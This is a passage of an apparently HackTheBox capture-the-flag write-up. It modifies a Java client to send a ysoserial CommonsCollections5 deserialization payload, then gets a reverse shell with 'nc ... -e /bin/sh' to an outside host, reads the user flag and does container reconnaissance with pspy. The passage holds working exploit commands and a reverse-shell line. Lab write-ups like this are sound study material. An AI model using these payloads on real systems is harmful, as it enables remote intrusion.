</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>        </span><span class=n>pwChangeButton</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>changePW</span><span class=p>(</span><span class=s>&#34;cyfun&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;whatever&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>MessageBuildException</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>MessageParseException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Failure during message building/parsing.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>passwordChange</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>controlPanel</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>textPane</span><span class=p>.</span><span class=na>setText</span><span class=p>(</span><span class=n>response</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>And the final <code>changePW</code> modification:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.File</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>changePW</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>newPassword</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>MessageParseException</span><span class=p>,</span><span class=w> </span><span class=n>MessageBuildException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=p>(){}.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getEnclosingMethod</span><span class=p>().</span><span class=na>getName</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>logger</span><span class=p>.</span><span class=na>logInfo</span><span class=p>(</span><span class=s>&#34;[+] Method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; was called by user &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>user</span><span class=p>.</span><span class=na>getUsername</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>AccessCheck</span><span class=p>.</span><span class=na>checkAccess</span><span class=p>(</span><span class=n>methodName</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>user</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Error: Method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; is not allowed for this user account&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//String data = new String(Files.readAllBytes(Paths.get(&#34;revshell.ser&#34;)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//data.getBytes()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>File</span><span class=w> </span><span class=n>fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=s>&#34;revshell.ser&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>fd</span><span class=p>.</span><span class=na>toPath</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serializedUser64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encode</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>console</span><span class=p>().</span><span class=na>writer</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>serializedUser64</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>action</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ActionMessage</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>sessionID</span><span class=p>,</span><span class=w> </span><span class=s>&#34;changePW&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>action</span><span class=p>.</span><span class=na>addArgument</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>serializedUser64</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>sendAndRecv</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>hasError</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Error: Your action caused an error on the application server!&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>getContentAsString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>In the first time I just generate my payload with a pingback to make sure it works.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ysoserial CommonsCollections5 &#39;wget http://10.10.14.114:8888&#39; &gt; revshell.ser
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s try to get a reverse shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ysoserial CommonsCollections5 &#39;nc 10.10.14.114 8888 -e /bin/sh&#39; &gt; revshell.ser
</span></span></code></pre></td></tr></table></div></div><p>Awesome we get it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 8888 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::8888 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.174:33803 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)
</span></span></code></pre></td></tr></table></div></div><h2 id=system-reconnaissance>System reconnaissance<a hidden class=anchor aria-hidden=true href=#system-reconnaissance>#</a></h2><p>Looks like the shell we can get are limiteds:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat /etc/shells
</span></span><span class=line><span class=cl># valid login shells
</span></span><span class=line><span class=cl>/bin/sh
</span></span><span class=line><span class=cl>/bin/ash
</span></span></code></pre></td></tr></table></div></div><p>A Debian kernel on an Alpine distro? It highly seems like we are in a docker
container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uname -a
</span></span><span class=line><span class=cl>Linux 032784d4da1d 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 Linux
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat /etc/os-release
</span></span><span class=line><span class=cl>NAME=&#34;Alpine Linux&#34;
</span></span><span class=line><span class=cl>ID=alpine
</span></span><span class=line><span class=cl>VERSION_ID=3.9.4
</span></span><span class=line><span class=cl>PRETTY_NAME=&#34;Alpine Linux v3.9&#34;
</span></span><span class=line><span class=cl>HOME_URL=&#34;https://alpinelinux.org/&#34;
</span></span><span class=line><span class=cl>BUG_REPORT_URL=&#34;https://bugs.alpinelinux.org/&#34;
</span></span></code></pre></td></tr></table></div></div><p>Where are we?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pwd
</span></span><span class=line><span class=cl>/home/qtc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ls -lhA
</span></span><span class=line><span class=cl>total 8
</span></span><span class=line><span class=cl>drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh
</span></span><span class=line><span class=cl>----------    1 qtc      qtc           33 Oct 30  2019 user.txt
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s read the user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chmod u+r user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat user.txt
</span></span><span class=line><span class=cl>7fab2c31fc7173a86872db45ae922073
</span></span></code></pre></td></tr></table></div></div><p>There are some scheduled jobs:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/etc/crontabs:
</span></span><span class=line><span class=cl>total 16
</span></span><span class=line><span class=cl>drwxr-xr-x    1 root     root          4096 Jan 29  2020 .
</span></span><span class=line><span class=cl>drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..
</span></span><span class=line><span class=cl>-rw-------    1 root     root            64 Oct 30  2019 qtc
</span></span><span class=line><span class=cl>-rw-------    1 root     root           283 Jan 23  2019 root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/etc/crontabs.back:
</span></span><span class=line><span class=cl>total 20
</span></span><span class=line><span class=cl>drwxr-xr-x    2 qtc      qtc           4096 Oct 30  2019 .
</span></span><span class=line><span class=cl>drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..
</span></span><span class=line><span class=cl>-rw-------    1 qtc      qtc              4 Oct 30  2019 cron.update
</span></span><span class=line><span class=cl>-rw-------    1 qtc      qtc             64 Oct 30  2019 qtc
</span></span><span class=line><span class=cl>-rw-------    1 qtc      qtc            283 Oct 30  2019 root
</span></span></code></pre></td></tr></table></div></div><p>Thanks to the backup directory we can read them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat /etc/crontabs.back/qtc
</span></span><span class=line><span class=cl>0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat /etc/crontabs.back/root
</span></span><span class=line><span class=cl># do daily/weekly/monthly maintenance
</span></span><span class=line><span class=cl># min   hour    day     month   weekday command
</span></span><span class=line><span class=cl>*/15    *       *       *       *       run-parts /etc/periodic/15min
</span></span><span class=line><span class=cl>0       *       *       *       *       run-parts /etc/periodic/hourly
</span></span><span class=line><span class=cl>0       2       *       *       *       run-parts /etc/periodic/daily
</span></span><span class=line><span class=cl>0       3       *       *       6       run-parts /etc/periodic/weekly
</span></span><span class=line><span class=cl>0       5       1       *       *       run-parts /etc/periodic/monthly
</span></span></code></pre></td></tr></table></div></div><p>There is a tar archive created from the logs, and we have permissions over
the 2 folders:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -lh /opt/fatty
</span></span><span class=line><span class=cl>total 10592
</span></span><span class=line><span class=cl>-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar
</span></span><span class=line><span class=cl>drwxr-xr-x    5 root     root        4.0K Oct 30  2019 files
</span></span><span class=line><span class=cl>drwxr-xr-x    1 qtc      qtc         4.0K Jan 29  2020 logs
</span></span><span class=line><span class=cl>-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh
</span></span><span class=line><span class=cl>drwxr-xr-x    1 qtc      qtc         4.0K Jul 30 12:00 tar
</span></span></code></pre></td></tr></table></div></div><p>I&rsquo;ll use <a href=https://github.com/DominicBreuker/pspy>pspy</a> to try to catch some flash events.</p><p>Lets download <a href=https://github.com/DominicBreuker/pspy>pspy</a> on our machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>wget</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>github</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>DominicBreuker</span><span class=o>/</span><span class=n>pspy</span><span class=o>/</span><span class=n>releases</span><span class=o>/</span><span class=n>download</span><span class=o>/</span><span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>/</span><span class=n>pspy64</span>
</span></span></code></pre></td></tr></table></div></div><p>Then start a web server to serve it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -run -e httpd . -p 9999
</span></span><span class=line><span class=cl>[2020-07-30 22:41:59] INFO  WEBrick 1.6.0
</span></span><span class=line><span class=cl>[2020-07-30 22:41:59] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
</span></span><span class=line><span class=cl>[2020-07-30 22:41:59] INFO  WEBrick::HTTPServer#start: pid=62423 port=9999
</span></span></code></pre></td></tr></table></div></div><p>Then on the target retrieve it and executes it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>cd</span> <span class=o>/</span><span class=n>tmp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>wget</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.114</span><span class=p>:</span><span class=mi>9999</span><span class=o>/</span><span class=n>pspy64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=n>u</span><span class=o>+</span><span class=n>x</span> <span class=n>pspy64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=n>pspy64</span>
</span></span><span class=line><span class=cl><span class=n>pspy</span> <span class=o>-</span> <span class=n>version</span><span class=p>:</span> <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span> <span class=o>-</span> <span class=n>Commit</span> <span class=n>SHA</span><span class=p>:</span> <span class=mi>9</span><span class=n>c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     <span class=err>ΓûêΓûêΓûôΓûêΓûêΓûê</span>    <span class=err>ΓûêΓûêΓûêΓûêΓûêΓûê</span>  <span class=err>ΓûêΓûêΓûôΓûêΓûêΓûê</span> <span class=err>ΓûôΓûêΓûê</span>   <span class=err>ΓûêΓûêΓûô</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûôΓûêΓûêΓûæ</span>  <span class=err>ΓûêΓûêΓûÆΓûÆΓûêΓûê</span>    <span class=err>ΓûÆ</span> <span class=err>ΓûôΓûêΓûêΓûæ</span>  <span class=err>ΓûêΓûêΓûÆΓûÆΓûêΓûê</span>  <span class=err>ΓûêΓûêΓûÆ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûôΓûêΓûêΓûæ</span> <span class=err>ΓûêΓûêΓûôΓûÆΓûæ</span> <span class=err>ΓûôΓûêΓûêΓûä</span>   <span class=err>ΓûôΓûêΓûêΓûæ</span> <span class=err>ΓûêΓûêΓûôΓûÆ</span> <span class=err>ΓûÆΓûêΓûê</span> <span class=err>ΓûêΓûêΓûæ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûÆΓûêΓûêΓûäΓûêΓûôΓûÆ</span> <span class=err>ΓûÆ</span>  <span class=err>ΓûÆ</span>   <span class=err>ΓûêΓûêΓûÆΓûÆΓûêΓûêΓûäΓûêΓûôΓûÆ</span> <span class=err>ΓûÆ</span> <span class=err>Γûæ</span> <span class=err>ΓûÉΓûêΓûêΓûôΓûæ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûÆΓûêΓûêΓûÆ</span> <span class=err>Γûæ</span>  <span class=err>ΓûæΓûÆΓûêΓûêΓûêΓûêΓûêΓûêΓûÆΓûÆΓûÆΓûêΓûêΓûÆ</span> <span class=err>Γûæ</span>  <span class=err>Γûæ</span> <span class=err>Γûæ</span> <span class=err>ΓûêΓûêΓûÆΓûôΓûæ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûÆΓûôΓûÆΓûæ</span> <span class=err>Γûæ</span>  <span class=err>ΓûæΓûÆ</span> <span class=err>ΓûÆΓûôΓûÆ</span> <span class=err>ΓûÆ</span> <span class=err>ΓûæΓûÆΓûôΓûÆΓûæ</span> <span class=err>Γûæ</span>  <span class=err>Γûæ</span>  <span class=err>ΓûêΓûêΓûÆΓûÆΓûÆ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûæΓûÆ</span> <span class=err>Γûæ</span>     <span class=err>Γûæ</span> <span class=err>ΓûæΓûÆ</span>  <span class=err>Γûæ</span> <span class=err>ΓûæΓûæΓûÆ</span> <span class=err>Γûæ</span>     <span class=err>ΓûôΓûêΓûê</span> <span class=err>ΓûæΓûÆΓûæ</span>
</span></span><span class=line><span class=cl>    <span class=err>ΓûæΓûæ</span>       <span class=err>Γûæ</span>  <span class=err>Γûæ</span>  <span class=err>Γûæ</span>  <span class=err>ΓûæΓûæ</span>       <span class=err>ΓûÆ</span> <span class=err>ΓûÆ</span> <span class=err>ΓûæΓûæ</span>
</span></span><span class=line><span class=cl>                   <span class=err>Γûæ</span>           <span class=err>Γûæ</span> <span class=err>Γûæ</span>
</span></span><span class=line><span class=cl>                               <span class=err>Γûæ</span> <span class=err>Γûæ</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Config</span><span class=p>:</span> <span class=n>Printing</span> <span class=n>events</span> <span class=p>(</span><span class=n>colored</span><span class=o>=</span><span class=bp>true</span><span class=p>):</span> <span class=n>processes</span><span class=o>=</span><span class=bp>true</span> <span class=o>|</span> <span class=n>file</span><span class=o>-</span><span class=n>system</span><span class=o>-</span><span class=n>events</span><span class=o>=</span><span class=bp>false</span> <span class=o>|||</span> <span class=n>Scannning</span> <span class=k>for</span> <span class=n>processes</span> <span class=n>every</span> <span class=mi>100</span><span class=n>ms</span> <span class=ow>and</span> <span class=n>on</span> <span class=n>inotify</span> <span class=n>events</span> <span class=o>|||</span> <span class=n>Watching</span> <span class=n>directories</span><span class=p>:</span> <span class=p>[</span><span class=o>/</span><span class=n>usr</span> <span class=o>/</span><span class=n>tmp</span> <span class=o>/</span><span class=n>etc</span> <span class=o>/</span><span class=n>home</span> <span class=o>/</span><span class=k>var</span> <span class=o>/</span><span class=n>opt</span><span class=p>]</span> <span class=p>(</span><span class=n>recursive</span><span class=p>)</span> <span class=o>|</span> <span class=p>[]</span> <span class=p>(</span><span class=n>non</span><span class=o>-</span><span class=n>recursive</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Draining</span> <span class=n>file</span> <span class=n>system</span> <span class=n>events</span> <span class=n>due</span> <span class=n>to</span> <span class=n>startup</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>done</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>7</span>      <span class=o>|</span> <span class=n>crond</span> <span class=o>-</span><span class=n>b</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>2289</span>   <span class=o>|</span> <span class=o>./</span><span class=n>pspy64</span>
